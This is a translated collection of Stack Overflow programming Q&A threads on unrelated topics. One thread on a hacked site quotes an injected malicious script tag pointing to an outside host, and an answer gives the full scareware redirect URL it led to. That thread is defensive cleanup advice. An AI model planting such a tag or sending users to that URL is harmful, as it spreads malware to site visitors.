*   来自 SD 卡的视频

通过使用[这个](http://code.google.com/p/ytd-android/)

脚步：

1) 从此[链接下载 ytd-android-0.2.tar.gz](http://code.google.com/p/ytd-android/downloads/list)

2) 导入为 android 项目。

3) 将文件：**GlsAuthorizer.java**替换为**ClientLoginAuthorizer.java**

**4）在ClientLoginAuthorizer.java**中设置用户名和密码

 ****5) 在www.appspot.com**注册您的电子邮件 ID

 **6) 在**string.xml 文件中设置所有值**

7）运行项目.....给你。

**ClientLoginAuthorizer.java**的代码

 **```
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.UnsupportedEncodingException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

import android.app.Activity;
import android.content.Context;
import android.util.Log;

/**
 * Created by IntelliJ IDEA. User: jarekw Date: Nov 18, 2010 Time: 11:21:36 PM
 * To change this template use File | Settings | File Templates.
 */
public class ClientLoginAuthorizer implements Authorizer {
    public static final String YOUTUBE_AUTH_TOKEN_TYPE = "youtube";
    private static final String AUTH_URL = "https://www.google.com/accounts/ClientLogin";
    private Context ctx;
    private static final String LOG_TAG = ClientLoginAuthorizer.class
            .getSimpleName();

    public ClientLoginAuthorizer(Context context) {
        this.ctx = context;

    }

    @Override
    public void fetchAccounts(AuthorizationListener<String[]> listener) {
        // not used

    }

    @Override
    public void addAccount(Activity activity,
            AuthorizationListener<String> listener) {
        // not used

    }

    @Override
    public void fetchAuthToken(String accountName, Activity activity,
            AuthorizationListener<String> listener) {
        Log.d(LOG_TAG, "Getting " + YOUTUBE_AUTH_TOKEN_TYPE + " authToken for "
                + accountName);
        try {
            String token = getCLAuthToken(accountName);
            listener.onSuccess(token);
        } catch (Exception e) {

            listener.onError(e);

        }
    }

    @Override
    public String getAuthToken(String accountName) {
        try {
            String token = getCLAuthToken(accountName);
            return token;
        } catch (IOException e) {

            e.printStackTrace();
            return null;

        }
    }

    public String getCLAuthToken(String accountName) throws IOException {
        HttpURLConnection urlConnection = getGDataUrlConnection(AUTH_URL);
        urlConnection.setRequestMethod("POST");
        urlConnection.setDoOutput(true);
        urlConnection.setRequestProperty("Content-Type",
                "application/x-www-form-urlencoded");
        String template = "Email=%s&Passwd=%s&service=%s&source=%s";
        String userName = "USERNAME"; // TODO
        String password = "PASSWORD"; // TODO
        String service = YOUTUBE_AUTH_TOKEN_TYPE;
        String source = ctx.getString(R.string.client_id);
        String loginData = String.format(template, encode(userName),
                encode(password), service, source);
        OutputStreamWriter outStreamWriter = new OutputStreamWriter(
                urlConnection.getOutputStream());
        outStreamWriter.write(loginData);
        outStreamWriter.close();
        int responseCode = urlConnection.getResponseCode();
        if (responseCode != 200) {
            Log.d(LOG_TAG, "Got an error response : " + responseCode + " "
                    + urlConnection.getResponseMessage());
            throw new IOException(urlConnection.getResponseMessage());
        } else {

            InputStream is = urlConnection.getInputStream();
            InputStreamReader isr = new InputStreamReader(is);
            BufferedReader br = new BufferedReader(isr);
            String line = null;
            while ((line = br.readLine()) != null) {
                if (line.startsWith("Auth=")) {
                    String split[] = line.split("=");
                    String token = split[1];
                    Log.d(LOG_TAG, "Auth Token : " + token);
                    return token;
                }
            }
        }

        throw new IOException("Could not read response");

    }

    private String encode(String string) throws UnsupportedEncodingException {
        return URLEncoder.encode(string, "UTF-8");

    }

    private HttpURLConnection getGDataUrlConnection(String urlString)
            throws IOException {
        URL url = new URL(urlString);
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        return connection;

    }

    @Override
    public String getFreshAuthToken(String accountName, String authToken) {
        return getAuthToken(accountName);

    }

    public static class ClientLoginAuthorizerFactory implements
            AuthorizerFactory {
        public Authorizer getAuthorizer(Context context, String authTokenType) {
            return new ClientLoginAuthorizer(context);

        }
    }
} 
```******

# javascript - 如何销毁 JavaScript 对象？

> ID：10246215
> 
> 赞同：85
> 
> 时间：2012-04-20T12:25:46.573
> 
> 标签：javascript, object, destroy

最近，我遇到了我的一个应用程序，它消耗了太多内存并且以 10 MB/秒的速度增加。

所以，我想知道如何销毁 JavaScript 对象和变量，这样内存消耗就会减少并且我的 FF 不会被销毁。

我每 8 秒调用一次我的两个脚本，而无需重新加载页面。

```
function refresh() {
    $('#table_info').remove();
    $('#table').hide();
    if (refreshTimer) {
        clearTimeout(refreshTimer);
        refreshTimer = null ;
    }
    document.getElementById('refresh_topology').disabled=true; 
    $('<div id="preload_xml"></div>').html('<img src="pic/dataload.gif" alt="loading data" /><h3>Loading Data...</h3>').prependTo($("#td_123"));
    $("#topo").hide();
    $('#root').remove();
    show_topology();
} 
```

如何查看哪个变量导致**内存开销**，停止执行该进程的方法是什么？

* * *

## 回答 #1

> 赞同：99
> 
> 时间：2012-04-20T12:39:32.833

您可以将所有代码放在一个命名空间下，如下所示：

```
var namespace = {};

namespace.someClassObj = {};

delete namespace.someClassObj; 
```

使用`delete`关键字将删除对属性的引用，但在底层，JavaScript 垃圾收集器 (GC) 将获得有关要回收哪些对象的更多信息。

您还可以使用 Chrome 开发人员工具来获取应用程序的内存配置文件，以及应用程序中的哪些对象需要按比例缩小。

* * *

## 回答 #2

> 赞同：32
> 
> 时间：2012-04-20T12:30:24.087

您不能删除对象，当不再引用它们时它们会被删除。您可以使用 删除参考`delete`。

但是，如果您在对象中创建了**循环引用**，则可能必须解耦一些东西。

* * *

## 回答 #3

> 赞同：30
> 
> 时间：2015-10-16T17:47:05.483

虽然现有的答案已经给出了解决问题和问题后半部分的解决方案，但它们没有为问题前半部分的自我发现方面提供答案，即粗体：

> “我怎样才能看到哪个变量导致**内存开销**......？”

3 年前它可能还没有那么健壮，但是 Chrome 开发者工具的“**配置文件**”部分现在已经非常强大并且功能丰富。Chrome 团队有[一篇关于使用它的有见地](https://developer.chrome.com/devtools/docs/javascript-memory-profiling)的文章，因此还有**垃圾收集（GC）**如何在 javascript 中工作，这是这个问题的核心。

由于`delete`基本上是 Yochai Akoka 当前接受的答案的根源，因此记住 delete 的作用很重要。如果不结合接下来两个答案中 GC 如何工作的概念，它是无关紧要的：如果存在对对象的现有引用，则它不会被清理。答案更正确，但可能不那么受欢迎，因为它们需要更多的思考，而不仅仅是写“删除”。是的，一种可能的解决方案可能是使用`delete`，但如果有另一个对内存泄漏的引用并不重要。

[另一个答案](https://stackoverflow.com/a/10246275/13468777)适当地提到了循环引用，Chrome 团队文档可以提供更清晰的说明以及验证原因的工具。

既然在这里提到，提供资源[理解删除](http://perfectionkills.com/understanding-delete/)`delete`也可能有用。尽管它没有**涉及**任何与 javascript 的垃圾收集器真正相关的实际解决方案。

 *** * *

## 回答 #4

> 赞同：9
> 
> 时间：2012-04-20T12:29:19.663

构建您的代码，使您的所有临时对象都位于闭包内，而不是全局命名空间/全局对象属性，并在您完成它们后超出范围。GC 会处理剩下的事情。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-06-10T20:20:06.263

我遇到了这样的问题，并且想简单地更改有问题对象的子对象的 innerHTML。

```
adiv.innerHTML = "<div...> the original html that js uses </div>"; 
```

看起来很脏，但它救了我的命，因为它有效！**

# version-control - 为什么 mercurial 会警告我有关不同的重命名？

> ID：10246216
> 
> 赞同：1
> 
> 时间：2012-04-20T12:25:51.053
> 
> 标签：version-control, mercurial

我已经使用 Mercurial 版本控制系统有一段时间了，有几次我看到系统警告我有关不同的重命名。

我所做的是制作一个较大文件的两个不同后代。例如，我有一个名为的类`HttpRequest`，它是`CGI.pm`. 后来，当我决定转向`PSGI`协议时，我制作了这个文件的两个副本，即`Cgi.pm`和`Psgi.pm`. 原来的类仍然存在并成为抽象的，新的类继承自它。

我一直认为这是处理这种情况的首选方法，因为每个文件都保留了它所基于的文件的历史记录。但是当我将更改推送到远程服务器时，它会告诉我：

```
remote: adding changesets
remote: adding manifests
remote: adding file changes
remote: added 2 changesets with 2 changes to 2 files (+1 heads)
remote: warning: detected divergent renames of lib/HttpRequest.pm to:
remote:  lib/HttpRequest/Cgi.pm
remote:  lib/HttpRequest/Psgi.pm 
```

这很糟糕吗？我应该以其他方式吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T12:32:44.283

看起来问题不在于您制作了同一个源文件的版本副本，而在于有两个变更集，其中文件每次都被重命名为不同的名称，并且这些变更集不在同一开发线中。这个观察是基于你的拉力创造了一个新的头的事实。

因此，在这种情况下，Mercurial 会警告您 pull 已经创建了一个新的 head，因此您的 repo 中有两个 head *，每个head`CGI.pm`都已重命名为不同的文件*。因此，如果您尝试将这些合并为一个，您将不得不决定应该坚持哪个更改。

防止这种情况发生的最简单方法是复制原始文件而不是重命名它。更准确地说，*第*一次您可以重命名它，但在所有后续情况下，您都必须复制它（显然，如果您在同一开发线上这样做，如果您不这样做但打算稍后合并不同的线，则这是必要的）。

您可能还想查看 Mercurial: The Definitive Guide 的[相关部分](http://hgbook.red-bean.com/read/mercurial-in-daily-use.html#id364290)。

# iphone - 在 iOS 中动态创建视图

> ID：10246220
> 
> 赞同：0
> 
> 时间：2012-04-20T12:25:58.993
> 
> 标签：iphone, objective-c, ios, uiview, uiviewcontroller

我有一个只有一个视图的项目。我正在以编程方式在其上绘制所有内容。因此，当我想向我的项目添加另一个视图（屏幕）时，我创建了一个继承自 UIViewController 类并实现方法的类

```
- (void)viewDidLoad 
```

然后我想从我的原始视图加载这个视图，我这样做：

在**ViewController.h**

```
#import <UIKit/UIKit.h>
#import "TestViewControllerClass.h"

@interface ViewController : UIViewController <UITableViewDataSource> {
}

@property (strong,nonatomic) TestViewControllerClass *testView;

@end 
```

在**ViewController.m中**

```
@implementation ViewController

@synthesize testView;

- (void)viewDidLoad
{
    [super viewDidLoad];

    testView = [[TestViewControllerClass alloc] init];
    [self.view addSubview:testView]; //crash here

} 
```

然后在我的**TestViewControllerClass.h**

```
#import <UIKit/UIKit.h>

@interface TestViewControllerClass : UIViewController

@end 
```

和**TestViewControllerClass.m**

```
- (void)viewDidLoad
{
    [super viewDidLoad];
} 
```

为了检查方法**wiewDidLoad**是否会被执行，我放了一个断点，但什么也没发生。事实上，我的应用程序崩溃了（我在代码中添加了注释）。

当我收到崩溃时：***-[TestViewControllerClass superview]: unrecognized selector sent to instance 0x683aca0***

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-20T12:27:47.357

代替

```
[self.view addSubview:testView]; //crash here 
```

和

```
[self.view addSubview:testView.view]; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-20T12:28:59.447

使用此代码...

```
[self.view addSubview:testView.view]; 
```

希望对你有帮助...

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-04-20T12:32:53.033

您正在做的是将您的 ViewController 设置为视图，而不是真正的视图

```
testView = [[TestViewControllerClass alloc] init];
    [self.view addSubview:testView]; //crash here 
```

这显然会崩溃。假设您在名为 view 的头文件中声明了一个视图变量，请使用

```
testView = [[TestViewControllerClass alloc] init];
     [self.view addSubview:testView.view]; 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-20T12:32:43.520

您可以在下面加载两种类型的 uiviewcontroller 加载：

```
[self.view addSubview:testView.view]; 
```

（或者）

使用以下代码的presentmodalviewcontroller：

```
 testView *popupView = [[testView alloc] initWithNibName:@"testView" bundle:nil];
    popupView.modalTransitionStyle = UIModalTransitionStyleCoverVertical;
    [self presentModalViewController:popupView animated:YES]; 
```

关闭模态视图控制器下面的代码：

```
[self dismissModalViewControllerAnimated:YES]; 
```

谢谢..！

# php - CodeIgniter + FB PHP SDK + mod rewrite 删除 index.php = 灾难

> ID：10246223
> 
> 赞同：0
> 
> 时间：2012-04-20T12:26:12.740
> 
> 标签：php, facebook, apache, codeigniter, facebook-php-sdk

我将以下代码添加到我的 CodeIgniter 项目到我的 .htaccess 以删除 index.php：

```
#Removes access to the system folder by users.
#Additionally this will allow you to create a System.php controller,
#previously this would not have been possible.
#'system' can be replaced if you have renamed your system folder.
RewriteCond %{REQUEST_URI} ^system.*
RewriteRule ^(.*)$ /index.php?/$1 [L]

#When your application folder isn't in the system folder
#This snippet prevents user access to the application folder
#Submitted by: Fabdrol
#Rename 'application' to your applications folder name.
RewriteCond %{REQUEST_URI} ^application.*
RewriteRule ^(.*)$ /index.php?/$1 [L]

#Checks to see if the user is attempting to access a valid file,
#such as an image or css document, if this isn't true it sends the
#request to index.php
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule ^(.*)$ index.php?/$1 [L] 
```

一切正常。我的网址不再需要 index.php 了。

但是，这产生了一个有趣的副作用，当我尝试使用 Facebook OAuth 登录时，我收到以下错误：

> =">https://www.facebook.com/dialog/oauth?client_id=123&redirect_uri=http%3A%2F%2Fwww.domain.com%2Fsign_in%2Ffacebook%2F&state=8f3d1e5de60e47935460564a41f35af3&scope=email# *=*的网页 导致重定向太多。清除此站点的 cookie 或允许第三方 cookie 可能会解决此问题。如果没有，则可能是服务器配置问题，而不是您的计算机问题。

注意：客户端 ID 和重定向 URI 已更改为隐私。

我正在使用 PHP SDK 3.1.1 [https://github.com/facebook/php-sdk](https://github.com/facebook/php-sdk)并遵循[http://developers.facebook.com/blog/post/503/](http://developers.facebook.com/blog/post/503/)上的示例代码。当我的 URL 中仍有 index.php 时，一切正常。在我添加重写规则以删除 index.php 后，问题似乎已经开始。

任何想法发生了什么以及如何解决这个问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T13:42:52.303

Try to following patch: In system/core/config.php file, in site_url method replace the following line return $this->slash_item('base_url').$this->slash_item('index_page').$this->_uri_string($uri).$suffix; with new code: return $this->slash_item('base_url').$this->_uri_string($uri).$suffix;

It might get working...

# c++ - 打开目录错误？

> ID：10246227
> 
> 赞同：0
> 
> 时间：2012-04-20T12:26:32.833
> 
> 标签：c++, c, opendir

我收到此指令的错误：

```
 dp = opendir ("%APPDATA%/.");

  output: 
  Couldn't open directory: Mo such file or directory. 
```

但我没有得到这个指令的错误：

```
dp = opendir ("C:/Users/xrobot/AppData/.");

output:
.
..
Local
LocalLow
Roaming 
```

为什么 ？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-20T12:29:10.850

`opendir`不会像`%APPDATA%`shell 那样扩展元变量。所以这些东西可以从命令行工作，但不能从程序中工作。在您的程序中，您必须使用绝对或相对路径。

您可能可以获得所需的路径`getenv()`，

```
const char *appData = getenv("APPDATA");
if (appData) {
    dp = opendir(appData);
} else {
    /* die or recover */
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-20T12:29:37.467

因为第一个`opendir`是**从字面上**试图打开目录`%APPDATA%/.`。

# asp.net-mvc-3 - 如何重定向具有错误角色的用户（已登录）以查看页面？

> ID：10246230
> 
> 赞同：0
> 
> 时间：2012-04-20T12:26:36.433
> 
> 标签：asp.net-mvc-3, membership-provider, http-get, redirecttoaction

我想将角色不正确的用户发送到另一个页面，但是当我使用时：

```
return RedirectToAction("Index", "Home"); 
```

我得到错误：

```
Cannot implicitly convert type 'System.Web.Mvc.RedirectToRouteResult' to 'System.Web.Mvc.ViewResult' 
```

这个错误是因为我在 http GET 而不是 http POST 中吗？

这是我的代码：

```
public ViewResult Index()
{
    if (User.IsInRole("Administrator") | User.IsInRole("SuperAdministrator"))
    {
        //Do Admin Things
        return View()
    }
    else
    {
        // Send to a different page
        return RedirectToAction("Index", "Home"); // I want to do this, but it gives me an error
    } 
```

在这种情况下，如何根据用户的角色重定向用户？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-20T12:28:31.693

将您的方法更改为 return`ActionResult`而不是`ViewResult`. 后者期望您将返回`View()`，而前者是允许任何类型的 ActionResult 对象的基本类型，例如由`RedirectToAction`and返回的对象`View`

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-20T12:30:07.950

```
public ActionResult Index(){

} 
```

代替

```
public ViewResult Index(){

} 
```

# wcf - 什么是 WSE2QuickStartServer，我们可以使用其他证书来代替这个证书吗？

> ID：10246231
> 
> 赞同：0
> 
> 时间：2012-04-20T12:26:36.637
> 
> 标签：wcf, x509certificate, wse, wse3.0, wse2.0

在 WSE 中，`WSE2QuickStartServer`证书用于加密和签署消息的任何地方。

这个证书有什么特别之处，我们可以使用任何其他证书吗？如果是，证书应满足哪些要求？

注意：我知道 WSE 是一项遗留技术，但客户目前正在使用它；所以无论如何我们都必须支持它！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T20:52:29.790

没什么特别的，您可以使用任何其他证书。如果你用它来签名，你需要一个私钥。基本上任何对 ssl 有好处的证书也可以在这里工作。

# actionscript-3 - 如何列出位于媒体服务器上的文件？

> ID：10246232
> 
> 赞同：1
> 
> 时间：2012-04-20T12:26:50.853
> 
> 标签：actionscript-3, apache-flex, red5, flash-media-server

如何列出已录制或保存在媒体服务器上的流？你能给我举几个例子吗？你知道来源在哪里`ofla_demo.swf`吗？

**附言**

我需要列出客户端的文件。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-26T04:28:57.883

服务器的 oflaDemo 代码显示如何列出文件并将它们提供给客户端。服务器项目源可以在这里找到：[http ://red5.googlecode.com/svn/java/example/trunk/oflaDemo/](http://red5.googlecode.com/svn/java/example/trunk/oflaDemo/)

查看此 java 文件以了解如何创建过滤器和列表： [http ://code.google.com/p/red5/source/browse/java/example/trunk/oflaDemo/src/org/red5/demos/oflaDemo/演示服务.java](http://code.google.com/p/red5/source/browse/java/example/trunk/oflaDemo/src/org/red5/demos/oflaDemo/DemoService.java)

oflaDemo 客户端的源代码为 AS2 格式 (.fla)，位于此处：[http ://red5.googlecode.com/svn/flash/trunk/ofla_demo.fla](http://red5.googlecode.com/svn/flash/trunk/ofla_demo.fla)

# c++ - 快速排序和合并排序错误的内存分配（不对 32k 个元素进行排序）

> ID：10246235
> 
> 赞同：1
> 
> 时间：2012-04-20T12:27:14.223
> 
> 标签：c++, algorithm, sorting, memory-management

已修复 - 我也包含了 .cpp 文件，导致模板类出现链接器问题 - 我在 mergesort.cpp 中存在内存泄漏，这导致快速排序（包含在之后）也无法正常工作。Introsort 之前已包含在内，因此运行良好。

我的 qsort 算法：

```
#include "quicksort.h"

template <class typ> 
void quicksort(typ* tab, long int begin, long int end) {
  long int i = begin; 
  long int j = end;
  typ tmp;
  typ pivot = tab[(begin + end) / 2];

  /* podziel */
  while (i <= j) {
        while (tab[i] < pivot)
              i++;
        while (tab[j] > pivot)
              j--;
        if (i <= j) {
              tmp = tab[i];
              tab[i] = tab[j];
              tab[j] = tmp;
              i++;
              j--;
        }
  };

  /* rekurencja */
  if (begin < j)
        quicksort(tab, begin, j);
  if (i < end)
        quicksort(tab, i, end); 
} 
```

我已经使用 Visual Studio 11（win 64）和 dev c++ 在 2 台不同的计算机上构建了它。我的归并排序也是如此。32002 个元素，仅此而已。

合并排序：

```
#include "mergesort.h"

using namespace std;

template <class typ>
void merge(typ *tab, long int begin, long int mid, long int end){
 typ *tab_pom = new typ[end+1];
 long int  i,j,k;

 i=begin; //pierwsza czesc
 j=mid+1; //druga czesc
 k=0;

 while ( (i<=mid) && (j<=end) ){ //pierwsze mniej niz srodek drugie mniej niz koniec
           if(tab[i] < tab[j]){
                tab_pom[k]=tab[i];
                i++;
                k++;
           }else{
                tab_pom[k]=tab[j];                
                j++;
                k++;
           }   
 }

 if (!(i<=mid)){
      while(j<=end){  
           tab_pom[k]=tab[j];
           k++;
           j++;
      } 
 }else{

      if (!(j<=end)){
           while(i<=mid){
                tab_pom[k]=tab[i];
                k++;
                i++;
           } 
      }
 }
 k=0;
 for (i=begin;i<=end;i++){
      tab[i]=tab_pom[k];
      k++;
 }         
}

// dzieli dane az do otzrymania posortowanych tablic jedno elementowych

template <class typ>
void merge_sort(typ *tab, long int begin, long int end){
 long int mid;

 if (begin < end){
      mid=(begin+end)/2;
      merge_sort(tab,begin,mid);
      merge_sort(tab,mid+1,end);
      merge(tab,begin,mid,end);
 }    
} 
```

我还写过 introsort，它适用于任何数量的元素。我尝试在 Visual Studio 11 -> 项目 -> 属性 -> 链接器 -> 堆栈保留大小 -> 80000000 中增加堆栈大小。没有任何变化。任何帮助表示赞赏。

资源：

```
#include <iostream>
#include <time.h>
#include "introspectiv.h"
#include "introspectiv.cpp"
#include "mergesort.h"
#include "mergesort.cpp"
#include "quicksort.h"
#include "quicksort.cpp"

using namespace std;

//funkcja do kopiowania tablicy 
template<class typ>
void kopiuj(typ* tabl_1, typ* tabl_2, int indeks){
for (int i = 0 ; i < indeks ; i++) tabl_2[i] = tabl_1[i];
}

int main() {
//tworzy tablice
cout << "podaj rozmiary tablicy wypelnionej losowymi liczbami: ";
int wybor;
clock_t czas[7];
clock_t start, stop;
long int n, i, end, begin;
cin >> n;
int *tablica = new int[n];
int *tab_pom = new int[n];
for (i=0; i<n; i++){
    tablica[i] = rand() % 100;
}

end = n-1;
begin = 0;

float procent[] = {0, 0.25, 0.5, 0.75, 0.95, 0.99, 0.997};

cout << endl << "wybierz algorytm sortowania: " << endl;
cout << "quicksort - 1 " << endl;
cout << "mergesort - 2 " << endl;
cout << "introspektywne - 3 " << endl;
cin >> wybor;
switch (wybor)
{
case 1: {
    for (i=0; i<7; i++){
        kopiuj(tablica, tab_pom, end);
        end = end*procent[i]; 
        quicksort(tab_pom, begin , end);

        end = n-1;
        start=clock();
        quicksort(tab_pom, begin , end);
        stop=clock();  
        czas[i] = stop-start;

            }
        }

case 2: {
    start=clock();  
    merge_sort(tablica, begin , end);
    stop=clock();
        }
case 3: {
    start=clock();
    introspective(tablica, n);
    stop=clock();
        }
default: break;
    }

//for (i=0; i<n; i++){
//  cout<<tablica[i]<< " ";
//}

cout << endl << "Czas wybranego sortowania: " << endl; 

for (i=0; i<7; i++){
cout << "Dla " << procent[i]*100 << "% posortowanych danych: " << czas[i] << " ms"    << endl << endl;
}
system("pause");
} 
```

在介绍和合并排序中计算时间还没有完成。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-20T12:53:37.050

**快速排序**：对于 32000 个元素，快速排序只进行大约 15 次递归，您不必担心堆栈大小。问题可能是您尝试传递的对象是函数中的局部变量，因此大小有限。尝试将其分配为全局或静态变量，例如：

```
void myfunction(){
    static int myelements[40000];
    //...
    merge_sort(myelements, 0, sizeof(myelements)/sizeof(int));
    //....
} 
```

**合并排序**：我看到您多次调用 new ，但没有删除。我不明白为什么你需要分配内存，你可以只使用指针。尝试添加

```
delete[] tab_pom; 
```

在合并结束时；

下次尝试提供更多诊断帮助，而不是不起作用。也许是错误信息。干杯，希望它有帮助。

# c# - 如何在 .NET MVC 3 中实现正确的 HTTP 错误处理？

> ID：10246237
> 
> 赞同：0
> 
> 时间：2012-04-20T12:27:27.343
> 
> 标签：c#, asp.net, asp.net-mvc, asp.net-mvc-3

我在以下[帖子](https://stackoverflow.com/questions/4911212/how-to-implement-proper-http-error-handling-in-net-mvc-2)中指的是达林的回答。

我正在使用 MVC3，我想知道这是否仍然是一种处理错误的方法？

在 rrror 控制器中，他具有以下内容：

```
public ActionResult Http404()
{
     Response.StatusCode = 404;

     return Content("404", "text/plain");
} 
```

使用他的代码.. 我希望它显示完整的 URL，我该怎么做？所以它需要，`www.mywebsite.com/Error/Http404`而不仅仅是`www.mywebsite.com`. 我该怎么做？我认为如果我有以下代码，那么它将显示完整的 URL，但它仍然只显示 www.mywebsite.com：

```
public ActionResult Http404()
{
     Response.StatusCode = 404;

     return View("Http404");
} 
```

如何获得在 global.asax.cs 中设置的 ex 值以显示在此页面上？

我不再在 web.config 中处理我的错误，因为它一直在查询字符串中有一个 aspxerrorpath。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-23T08:54:32.193

你试过了吗：http: [//community.codesmithtools.com/CodeSmith_Community/b/tdupont/archive/2011/03/01/error-handling-and-customerrors-and-mvc3-oh-my.aspx](http://community.codesmithtools.com/CodeSmith_Community/b/tdupont/archive/2011/03/01/error-handling-and-customerrors-and-mvc3-oh-my.aspx)

此示例不会重定向到错误页面，但会继续显示发生错误的请求的 url。我希望它会帮助你。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-23T12:36:22.013

因此，根据我的理解，您希望将用户重定向到有关异常的特定错误页面，以及您希望访问异常的错误页面。

这是我尝试过的，创建了一个基本控制器并覆盖了该`OnException`方法。在`OnException`方法内部，我正在做您在`Global.asax.cs`.

最重要的是，在处理异常之后，我`RedirectAction`在`Result`.`ExceptionContext`

为了`Exception`从错误视图中访问，我将异常存储在`TempData`. 从`ErrorController`我将异常作为`HandleErrorInfo`实例传递给视图。

这是完整的代码。

```
// BaseController
public class BaseController : Controller
{
  protected override void OnException(ExceptionContext filterContext)
  {
    if (!filterContext.ExceptionHandled)
    {
      var action = "General";

      if (filterContext.Exception is HttpException)
      {
        var httpException = filterContext.Exception as HttpException;

        switch (httpException.GetHttpCode())
        {
          case 404:
            // page not found
            action = "Error404";
            break;
          case 500:
            // server error
            action = "Error500";
            break;
          default:
            action = "General";
            break;
        }
      }

      filterContext.Result = RedirectToAction(action, "error");
      TempData["error"] = new HandleErrorInfo(filterContext.Exception, 
                          RouteData.Values["controller"].ToString(), 
                          RouteData.Values["action"].ToString());
      filterContext.ExceptionHandled = true;
    }
  }
}

// Error Controller
public class ErrorController : Controller
{
  public ActionResult Error404()
  {
    return View(TempData["error"] as HandleErrorInfo);      
  }

  // other methods
}

// Sample controller derives from BaseController.
public class HomeController : BaseController
{
  public ActionResult Index()
  {
    return View();
  }

  public ActionResult NotFound()
  {
    throw new HttpException(404, "Not Found");
  }
}

// Error404.cshtml
@model System.Web.Mvc.HandleErrorInfo
@{
  ViewBag.Title = "404 Not Found";
}
<h2>@ViewBag.Title</h2>

<p>
  Last Exception: @Model.Exception
</p> 
```

**更新：**这种方法的一个缺点是我们可以处理 HTTP 异常 404、500 或其他任何情况，如果它仅从控制器操作中抛出。

# javascript - 很难找到恶意 JS 行：

> ID：10246241
> 
> 赞同：1
> 
> 时间：2012-04-20T12:27:35.460
> 
> 标签：javascript, asp.net, security, iis-7, xss

我正在网站[http://palacechemicals.co.uk/](http://palacechemicals.co.uk/)上工作，该网站不知何故感染了恶意（但良性）的 JavaScript 行：

```
</title><script src=http://hgbyju.com/r.php ></script> 
```

在第 251 行。脚本尝试加载的 URL 返回 404，但 Google 仍将我们列入恶意软件列表。

我在另一台机器上有一个干净的、工作的本地副本，并且手动和软件比较了每个文件夹的文件大小，两者是相同的。我还多次搜索用于将数据导入 MSSQL Server 2008 的 SQL，以查找各种不同的字符串，包括 eval、script 等。

我真的被难住了，不知道接下来要寻找什么。

有没有其他人遇到过这个问题或者可以推荐下一步的行动？

难道是托管服务提供商被某种方式感染了？我们在一个共享的托管平台上，但是主机相当大且信誉良好。

任何投入将不胜感激。谢谢你。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T12:40:09.457

当我从 Chrome 访问该网站时，没有任何反应。但是当我从 Firefox 访问它时，脚本链接不会返回状态 404。有一个恶意脚本将我重定向到带有 Emma Watson 视频的“YouTube”。

那只发生过一次。第二次又是404。我将尝试从另一个 IP 地址复制它。

这是我被重定向的地方：

```
http://www1.thebest-scanerjjn.it.cx/o9gzj2z?2nvq3n=Vtfn5per7tvJzNjp1VPozMWrmqicnZSi19quZpTVysfUosXIeJnP1KuXppuQ3aWr7edqlNbRyZ%2FH0rpzmdLQ36Ld09jkpOOc1JaruLOLy9WwrF2hmZSclqKhmJ9jopzkp8%2Fo3diflpnrltegl6eL5t7Wq2ufpqaYoqadl5KWmeigsJSUoZmrnJ%2BjZJ%2Bc1aLb1dHTn9zq62Ch1sLUyuLU2NOm5eXjnpzX19KI1NTZm%2Bugw9zH6eOQ4JfUs9mn4uSNmKOKpbpSpanRz9HTzc%2FRmtPj2pbP4NuTxdSh6ZiYlaeS 
```

不要去那里。有一个可执行文件试图下载，谁知道还有什么。

所以脚本有效，它并不总是返回 404。在删除恶意链接后，您应该认真检查您的站点的安全性。

*   更改所有密码；
*   如果您使用 CMS，请将其更新到最新版本；
*   如果是自研网站，请审核其是否存在 SQL 注入和其他类型的安全漏洞。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-20T12:45:59.077

如果没有更多信息，我猜最简单的原因是最可能的：您的密码已被泄露，攻击者直接更改了您的脚本。

*   更正包含该行的页面/脚本。这可能意味着从您的干净副本重新加载整个站点，只是为了安全起见——攻击者可能有一个脚本可以动态更改文件。
*   使用强密码更改所有管理密码。

[我一直使用强密码，但至少有一个站点用作文件服务器。攻击者没有改变我的任何东西，但本可以做到。删除他们的内容并更改密码似乎暂时解决了这个问题。]

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-20T12:55:45.850

您应该搜索十进制和十六进制的 HTML 实体，而不是搜索明文。

例如：

`&#x0073;&#x0063;&#x0072;&#x0069;&#x0070;&#x0074;`是十六进制的 `script`

`&#x003c;&#x003e;`是十六进制的`<>`

如果您在 .NET 3.5 中使用 WebForms 并且没有正确清理输入字符串，则脚本注入的可能性很大。如果您在任何页面上关闭了请求验证，您应该针对这些替代输入测试这些页面。

就个人而言，我会查看受感染页面上的所有数据驱动输入，并扫描该数据以查找 html 实体，而不仅仅是和 等常用`eval`词`script`。

**编辑：** html 实体应始终以 开头`&#`，这应该比在 hex、decimal、unicode 等中查找关键字更容易搜索。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-04-23T10:50:49.297

您的站点容易受到 SQLi 的攻击，因此它会一次又一次地被感染。

问候 DeltaR

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-04-23T14:14:57.657

> *难道是托管服务提供商被某种方式感染了？我们在一个共享的托管平台上，但是主机相当大且信誉良好。*

